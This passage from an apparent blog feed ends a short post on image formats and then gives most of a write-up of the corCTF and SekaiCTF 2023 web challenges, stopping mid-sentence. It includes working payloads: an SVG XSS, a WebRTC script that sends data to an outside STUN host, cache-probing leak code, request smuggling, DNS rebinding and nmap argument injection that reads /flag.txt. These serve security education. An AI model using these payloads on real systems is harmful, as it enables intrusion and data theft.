punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/webp<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.webp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.gif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>picture</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This ensures that the results are displayed correctly on every browser and selects the image with usually smaller file size.</p><p>I tried it out myself with a simple gif that had an original size of 75 KB:</p><p><img src="/img/mp4-in-img-src/test.gif" alt="gif"></p><p>After converting it to WebP, it became 58 KB (-22.6%):</p><p><img src="/img/mp4-in-img-src/test.webp" alt="webp"></p><p>Converting it to mp4 reduced the size to 17 KB (-77.3%):</p><p><img src="/img/mp4-in-img-src/test.mp4" alt="Only supported by Safari, may not display properly"></p><p>Converting it to AVIF reduced the size to 11 KB (-85.3%):</p><p><img src="/img/mp4-in-img-src/test.avif" alt="AVIF format, may not be supported by newer browsers"></p><p>It seems that the latest file formats are quite impressive, reducing the size significantly.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Some websites use GIFs for certain images because they are animated and appear more impressive than static images. Sometimes, the need for an animated image arises, such as in the case of stickers where animation is expected.&lt;/p&gt;
&lt;p&gt;However, one of the well-known drawbacks of GIFs is their large file size. Especially on mobile devices with higher resolutions, larger images are required. Even if only a 52px image is displayed, a 156px image needs to be prepared, resulting in increased file size. In terms of web development, it is always better to have fewer and smaller resources to load.&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>corCTF 2023 &amp; Sekai CTF 2023 Writeup</title>
    <link href="https://blog.huli.tw/2023/09/02/en/corctf-sekaictf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/09/02/en/corctf-sekaictf-2023-writeup/</id>
    <published>2023-09-02T06:10:44.000Z</published>
    <updated>2023-09-02T06:32:20.275Z</updated>
    
    <content type="html"><![CDATA[<p>I participated in both of these events to some extent, but I didn’t look at every challenge. This post is just a note to briefly record the solutions, without going into too much detail.</p><p>As usual, here are the keywords I noted:</p><ol><li>GraphQL batch query + alias</li><li>Python os.path.join absolute path</li><li>Svg XSS, foreignObject</li><li>WebRTC CSP bypass</li><li>Status code xsleak</li><li>DNS rebinding</li><li>nmap command injection</li><li>Ruby rack file upload temporary storage</li><li>buildConstraintViolationWithTemplate EL injection</li><li>Request smuggling</li><li>document.baseURI</li><li>200&#x2F;404 status code xsleak</li></ol><span id="more"></span><h2><span id="corctf-2023">corCTF 2023</span></h2><p>The source code for the challenges is available here: <a href="https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web">https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web</a><br>Write-ups for some of the web challenges: <a href="https://brycec.me/posts/corctf_2023_challenges">https://brycec.me/posts/corctf_2023_challenges</a></p><h3><span id="force-118-solves">force (118 solves)</span></h3><p>The PIN code has 10,000 possible values, and you need to find the correct value within 10 requests using a GraphQL query.</p><p>The solution is to use batch query + alias, which allows you to try multiple times within a single request (taken from the article below):</p><pre class="line-numbers language-none"><code class="language-none">&#123;  flag0:flag(pin:0),  flag1:flag(pin:1),  flag2:flag(pin:2),  flag3:flag(pin:3),  flag4:flag(pin:4),  flag5:flag(pin:5)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Write-ups by others:</p><ol><li><a href="https://siunam321.github.io/ctf/corCTF-2023/web/force/">https://siunam321.github.io/ctf/corCTF-2023/web/force/</a></li><li><a href="https://github.com/hanzotaz/corctf2023_writeup/">https://github.com/hanzotaz/corctf2023_writeup&#x2F;</a></li></ol><h3><span id="msfrognymize-64-solves">msfrognymize (64 solves)</span></h3><p>The key is in this piece of code:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/anonymized/&lt;image_file>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">serve_image</span><span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".."</span> <span class="token keyword">in</span> file_path <span class="token keyword">or</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Image </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string"> cannot be found."</span></span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python’s <code>os.path.join</code> has a well-known behavior where it ignores everything before the absolute path:</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;test.txt&#39;)&#39;&#x2F;tmp&#x2F;abc&#x2F;test.txt&#39;&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;&#x2F;test.txt&#39;)&#39;&#x2F;test.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Therefore, by leveraging this behavior, you can achieve arbitrary file reading and obtain the flag.</p><p>Reference: <a href="https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/">https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/</a></p><h3><span id="frogshare-33-solves">frogshare (33 solves)</span></h3><p>This challenge uses a library called <a href="https://github.com/shubhamjain/svg-loader">svg-loader</a>, which automatically loads an SVG URL. Therefore, this challenge is based on SVG XSS.</p><p>During the import, for security reasons, scripts and inline scripts are automatically removed, but <code>&lt;foreignObject&gt;</code> is overlooked. This tag allows you to load HTML inside an SVG, and it can be bypassed by using iframe srcdoc:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009900<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreignObject</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>script<span class="token entity named-entity" title="&gt;">&amp;gt;</span>alert(document.domain)<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/script<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreignObject</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Next, you need to bypass CSP. In this challenge, <code>&lt;base&gt;</code> is used to change the location of script loading.</p><p>References:</p><ol><li><a href="https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/">https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/</a></li></ol><p>Renwa’s solution involves rebuilding the app inside an iframe and inserting a script using Next.js features: <a href="https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd">https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd</a></p><h3><span id="youdirect-5-solves">youdirect (5 solves)</span></h3><p>This challenge is about finding an open redirect on YouTube.</p><p>@EhhThing provided a solution (clicking will log you out) that involves two layers of open redirect:</p><p><a href="https://youtube.com/logout?continue=http://googleads.g.doubleclick.net/pcs/click?adurl=https://webhook.site/ccb8a675-14cb-419c-9e85-3b709a99e394">https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394</a></p><p>@pew provided:<br><a href="https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew">https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew</a></p><p>@Josh provided:<br><a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&q=https://sheiwknajaka.free.beeceptor.com/&v=-5Rm9ymMTRA&html_redirect=1">https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&amp;q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&amp;v=-5Rm9ymMTRA&amp;html_redirect=1</a></p><p>This one is special. In fact, each link in the YouTube video description generates a redirect link, but they are bound to session IDs on the webpage. Therefore, if you switch devices, you cannot use them. However, this link was generated on the mobile app, which may be because the mobile app does not have cookies and is not restricted. Interesting.</p><h3><span id="crabspace-4-solves">crabspace (4 solves)</span></h3><p>The first step is to use tera’s SSTI to leak environment variables: <code>&#123;&#123; get_env(name="SECRET") &#125;&#125;</code></p><p>Then, you can bypass CSP using WebRTC:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    c<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token literal-property property">iceServers</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">urls</span><span class="token operator">:</span><span class="token string">"stun:&#123;&#123;user.id&#125;&#125;.x.cjxol.com:1337"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>With these two steps, you can forge an admin session and obtain the flag.</p><p>References:</p><ol><li><a href="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/">corCTF 2023 web&#x2F;crabspace Writeup</a></li></ol><h3><span id="leakynote-3-solves">leakynote (3 solves)</span></h3><p>This challenge was solved during the competition. In simple terms, it provides a free HTML injection and a strict CSP:</p><pre class="line-numbers language-none"><code class="language-none">Content-Security-Policy &quot;script-src &#39;none&#39;; object-src &#39;none&#39;; frame-ancestors &#39;none&#39;;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>There is also a search API that returns 200 for success and 404 for failure. The goal is to find a way to leak the flag using this API.</p><p>One of the key points of this challenge is that the CSP header is added by nginx, and nginx only adds the header for 2xx and 3xx responses. Therefore, if the search fails and returns 404, the page will not have a CSP.</p><p>So, I came up with a cache probing method.</p><p>We insert <code>&lt;iframe src=search?q=a&gt;</code> into the note. If nothing is found, there is no CSP, so the content of the iframe will be loaded, and the CSS on the page will also be loaded. On the other hand, because it violates the CSP, nothing will be loaded.</p><p>Therefore, we can use the “whether CSS is cached” point to determine if the search found anything.</p><p>At that time, the implemented code was as follows:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> signal <span class="token operator">=</span> controller<span class="token punctuation">.</span>signal<span class="token punctuation">;</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">"no-cors"</span><span class="token punctuation">,</span>      <span class="token literal-property property">signal</span><span class="token operator">:</span> signal<span class="token punctuation">,</span>      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'reload'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token parameter">title<span class="token punctuation">,</span> url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// open note page</span>    <span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment">// wait 1s</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token comment">// clear cache and wait again</span>    <span class="token keyword">await</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>    <span class="token comment">// now the iframe should load, do cache probing</span>    <span class="token keyword">const</span> now <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'force-cache'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> end <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/report?title=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;ms=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>end<span class="token operator">-</span>now<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>end<span class="token operator">-</span>now <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/maybe/'</span> <span class="token operator">+</span> title<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// cached(no result) => 2~3ms</span>    <span class="token comment">// no cache(found) => 4.8~5.8ms</span>    w<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// copy paste the following from python script</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;a'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=c9193aee91b0fc29'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;c'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;d'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=0c6caa61575b9478'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;e'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;f'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=71652df64d54c0e4'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;g'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=354f3bec25e02332'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;k'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=066aa475493e1a4c'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;l'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=54a12f7b11098d2a'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;o'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=621591145bcfc8e0'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;r'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=6b44725cb5e274f0'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;t'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=e025b26e5e7117a1'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;y'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=f10001d89230485e'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;z'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After the competition, I saw two other interesting solutions. One of them leaks the information by loading fonts. When you do this:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> a<span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-before<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span>... <span class="token comment">/*10000 times */</span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-after<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Chrome determines how to handle it based on the status code. If it is 200, it checks if it is a valid font. If it is 404, it fails directly. Therefore, you can use the loading time of the font to determine the status code.</p><p>ref: <a href="https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45">https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45</a></p><p>The other solution also utilizes the feature of whether the CSS file is loaded, but instead of using cache, it causes server-side busyness by opening a large number of pages at once and slows down the response time to determine.</p><p>ref: <a href="https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09">https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09</a></p><h3><span id="pdf-pal-2-solves">pdf-pal (2 solves)</span></h3><p>The nginx config for this challenge looks like this:</p><pre class="line-numbers language-none"><code class="language-none">location &#x2F; &#123;    proxy_pass http:&#x2F;&#x2F;localhost:7777;    location ^~ &#x2F;generate &#123;        allow 127.0.0.1;        deny all;    &#125;    location ^~ &#x2F;rename &#123;        allow 127.0.0.1;        deny all;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>So, theoretically, accessing the <code>/generate</code> path should not be possible. However, you can bypass it by exploiting the difference between gunicorn and nginx parsers:</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;generate&#123;chr(9)&#125;HTTP&#x2F;1.1&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Related ticket: <a href="https://github.com/benoitc/gunicorn/issues/2530">https://github.com/benoitc/gunicorn/issues/2530</a></p><p>After bypassing, you can use the <code>/generate</code> function to generate a PDF. However, because this service blocks some keywords, it is not possible to directly convert the flag into a PDF.</p><p>The solution is to use DNS rebinding to POST to <code>http://localhost:7778</code> and retrieve the response.</p><p>For example, if we have a domain <code>example.com</code> with two A records, one pointing to the actual IP and the other pointing to 0.0.0.0, when the admin bot visits <code>http://example.com:7778/</code>, it resolves the actual IP and successfully retrieves the page.</p><p>At this point, we shut down the server and execute <code>fetch(&#39;http://example.com:7778/generate&#39;)</code>. Since the original IP is no longer accessible, the browser will fallback to 0.0.0.0 and successfully send the request to the desired location. Because it is same-origin, we can also retrieve the response.</p><p>For more details, please refer to:</p><ol><li><a href="https://github.com/nccgroup/singularity">https://github.com/nccgroup/singularity</a></li><li><a href="https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)">https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)</a></li></ol><h3><span id="lemon-csp-1-solve">lemon-csp (1 solve)</span></h3><p>Found a CSP bypass for 0-day, no public solution available.</p><h3><span id="0day-1-solve">0day (1 solve)</span></h3><p>This challenge involves finding a 1-day for VM2, no public solution available.</p><h2><span id="sekaictf-2023">SekaiCTF 2023</span></h2><p>The source code for the challenges is available here: <a href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web">https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web</a></p><h3><span id="scanner-service-146-solves">Scanner Service (146 solves)</span></h3><p>Input the port and host, and the following code will be executed:</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">nmap <span class="token operator">-</span>p <span class="token comment">#&#123;port&#125; #&#123;hostname&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>However, the input data goes through a sanitizer with character restrictions.</p><p>Tabs can be used, so you can use tabs to add parameters. During the competition, <code>-iL /flag.txt -oN -</code> was used to pass the challenge, redirecting the output to stdout, or using <code>/dev/stdout</code> is also valid.</p><p>The official writeup suggests using the <code>http-fetch</code> script to download the file to the local machine, and then running <code>nmap 